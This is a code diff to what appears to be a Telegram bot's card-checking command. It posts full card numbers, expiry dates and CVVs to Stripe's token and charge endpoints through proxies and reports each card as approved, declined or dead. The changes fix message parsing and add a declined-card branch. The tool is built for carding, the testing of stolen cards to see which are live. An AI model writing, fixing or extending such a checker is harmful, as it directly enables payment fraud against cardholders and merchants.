@@ -346,11 +346,12 @@ async def ch(message: types.Message):
 
         }
 
-        rx = session.post('https://api.stripe.com/v1/tokens',
+        rx =  requests.post('https://api.stripe.com/v1/tokens',
                           data=load, headers=header)
         token = rx.json()['id']
         res = rx.json()
-        msg = res['message']
+        
+        
         LastF = f'************{ccn[-4:]}'
         
         payload = {
@@ -366,11 +367,22 @@ async def ch(message: types.Message):
             "user-agent": UA,
             "accept-language": "en-US,en;q=0.9"
         }
+        if 'declined' in rx.text:
+            msg = res['error']['message']
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Declined
+<b>MSG</b>➟ {msg}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
         if 'Request rate limit exceeded.' in rx.text:
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Request rate limit exceeded.
-<b>MSG</b>➟ print(msg)
+<b>MSG</b>➟ {msg}
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -381,7 +393,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ API Key provided
-<b>MSG</b>➟ print(msg)
+<b>MSG</b>➟ {msg}
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -389,10 +401,10 @@ async def ch(message: types.Message):
 <b>BOT</b>: @{BOT_USERNAME}''')
         else:
 
-         ri = session.post('https://api.stripe.com/v1/charges', data=payload,
+         ri =  requests.post('https://api.stripe.com/v1/charges', data=payload,
                           headers=head)
-         ris = ri.json()
-         msg1 = ris['message']
+         res = ri.json()
+         msg1 = res['error']['message']
          toc = time.perf_counter()
 
          if 'Payment complete' in ri.text:
@@ -410,7 +422,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #ApprovedCCN
-<b>MSG</b>➟ print(msg1)
+<b>MSG</b>➟ {msg1}
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -420,7 +432,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Request rate limit exceeded.
-<b>MSG</b>➟ print(msg1)
+<b>MSG</b>➟ {msg1}
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -431,7 +443,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ API Key provided
-<b>MSG</b>➟ print(msg1)
+<b>MSG</b>➟ {msg1}
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -442,7 +454,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Insufficient_funds
-<b>MSG</b>➟ print(msg1)
+<b>MSG</b>➟ {msg1}
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -453,7 +465,7 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Declined
-<b>MSG</b>➟ print(msg1)
+<b>MSG</b>➟ {msg1}
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
@@ -463,7 +475,7 @@ async def ch(message: types.Message):
         await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ DEAD
-<b>MSG</b>➟ print(msg1)
+<b>MSG</b>➟ {msg1}
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
